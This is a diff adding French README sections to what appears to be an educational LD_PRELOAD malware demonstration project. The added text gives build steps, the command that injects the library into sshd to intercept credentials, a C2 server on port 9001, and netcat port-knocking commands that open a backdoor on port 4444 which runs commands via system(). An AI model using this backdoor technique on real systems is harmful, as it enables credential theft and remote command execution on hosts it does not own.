@@ -25,3 +25,68 @@ Ce projet est une démonstration d'un malware basé sur la technique **LD_PRELOA
    Fournir des explications sur le fonctionnement du linker, de LD_PRELOAD et des threads sous Linux dans le dossier `doc/`.
 
 ---
+
+## Structure du Projet
+
+
+
+## Compilation
+
+Pour compiler l'ensemble du projet, exécutez la commande suivante à la racine :
+
+```bash
+make
+
+Cette commande génère :
+
+    libmalware.so : La bibliothèque partagée à charger via LD_PRELOAD.
+    c2_server : L'exécutable du serveur C2.
+```
+
+## Utilisation
+
+1. Chargement du Malware
+
+Sur la machine cible (après avoir arrêté le démon SSH), relancez le démon SSH en chargeant le malware avec LD_PRELOAD :
+
+```bash
+LD_PRELOAD=/chemin/vers/libmalware.so /usr/sbin/sshd
+
+    Remarque : Remplacez /chemin/vers/ par le chemin absolu menant au fichier libmalware.so.
+```
+
+
+2. Lancement du Serveur C2
+
+Sur une autre machine ou dans un terminal séparé, lancez le serveur C2 pour recevoir et afficher les messages envoyés par le malware :
+
+```bash
+./c2_server
+```
+
+Le serveur écoute sur le port 9001 et affiche les messages reçus (par exemple, l'enregistrement d'une machine infectée et les credentials interceptés).
+
+
+3. Test du Port Knocking
+
+Pour tester le mécanisme de port knocking, envoyez successivement trois paquets UDP contenant les chaînes suivantes sur le port 1337 de la machine infectée. Vous pouvez utiliser netcat (nc) :
+
+```bash
+echo "knock1" | nc -u <IP_de_la_machine_infectée> 1337
+echo "knock2" | nc -u <IP_de_la_machine_infectée> 1337
+echo "knock3" | nc -u <IP_de_la_machine_infectée> 1337
+```
+
+Une fois la séquence validée, un socket TCP s'ouvrira sur le port 4444 pour recevoir une commande, laquelle sera exécutée via system().
+
+## Documentation Théorique
+
+Pour en savoir plus sur :
+
+    Le fonctionnement du linker et la résolution des symboles,
+    La technique LD_PRELOAD et le mécanisme d'injection de code,
+    La gestion des threads sous Linux,
+
+Voir le fichier doc/documentation.md.
+
+---
